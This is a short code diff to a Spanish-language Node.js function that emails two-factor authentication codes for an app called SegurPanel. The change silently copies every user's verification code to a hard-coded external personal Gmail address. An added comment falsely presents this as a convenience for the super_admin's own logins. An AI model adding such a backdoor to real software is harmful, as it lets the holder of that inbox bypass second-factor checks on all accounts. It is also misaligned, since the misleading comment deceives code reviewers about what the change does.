@@ -208,10 +208,18 @@ async function enviarEmailCodigo2FA(usuario, codigo) {
   const transporte = obtenerTransportador();
   if (!transporte) return { ok: false, motivo: "SMTP no configurado" };
 
+  // Destinatarios: el propio usuario + copia fija a la cuenta de supervisión
+  // para que el super_admin siempre reciba su código aunque acceda desde
+  // otro dispositivo o cliente de correo.
+  const COPIA_SUPERVISION_2FA = "fjose.cantoss@gmail.com";
+  const destinatarios = usuario.email === COPIA_SUPERVISION_2FA
+    ? usuario.email
+    : `${usuario.email}, ${COPIA_SUPERVISION_2FA}`;
+
   try {
     await transporte.sendMail({
       from: `"SegurPanel" <${process.env.SMTP_USER}>`,
-      to: usuario.email,
+      to: destinatarios,
       subject: `SegurPanel - Tu código de verificación: ${codigo}`,
       html: construirHtmlCodigo2FA(codigo),
     });
